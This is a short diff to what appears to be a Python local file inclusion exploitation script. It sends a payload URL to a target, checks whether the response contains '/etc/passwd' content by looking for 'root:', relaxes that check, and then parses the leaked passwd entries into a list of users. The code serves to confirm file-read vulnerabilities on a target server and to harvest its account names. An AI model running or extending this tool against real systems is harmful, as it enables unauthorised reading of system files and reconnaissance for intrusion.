@@ -68,10 +68,12 @@ def main():
     print(f"{Fore.CYAN}[/]{Style.RESET_ALL} Example payload: {test_url}")
     test = requests.get(test_url, timeout=3)
 
-    if "root:x:" not in test.text:
+    if "root:" not in test.text:
         print(f"{Fore.RED}[-]{Style.RESET_ALL} LFI not confirmed (or filtered)")
         return
     else:
+        if not test.text.startswith("root:"):
+            print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} LFI is not directly accessible, making a filter for it...")
         print(f"{Fore.GREEN}[+]{Style.RESET_ALL} LFI confirmed")
         passwd=passwd_ls(test.text)
         for usr in passwd:
